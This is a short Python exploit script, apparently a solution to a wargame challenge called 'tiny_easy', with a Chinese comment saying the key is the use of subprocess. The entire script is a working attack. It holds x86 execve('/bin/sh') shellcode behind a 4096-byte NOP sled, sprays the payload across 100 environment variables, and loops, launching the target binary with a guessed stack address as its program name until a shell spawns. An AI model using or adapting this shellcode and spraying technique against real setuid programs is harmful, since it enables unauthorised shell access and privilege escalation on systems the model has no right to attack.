#coding:utf-8
#!/usr/bin/python
#关键是subprocess的使用.....
import os
import subprocess

jumpto = "\xb0\xaf\xb5\xff"
shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopsled = "\x90"*4096;
payload = nopsled+shellcode

myenv = {}
# Arbitrary largeish number
for i in range(0,100):
    myenv["spray"+str(i)] = payload

while True:
    p = subprocess.Popen([jumpto], executable="/home/tiny_easy/tiny_easy", env=myenv)
    p.wait()
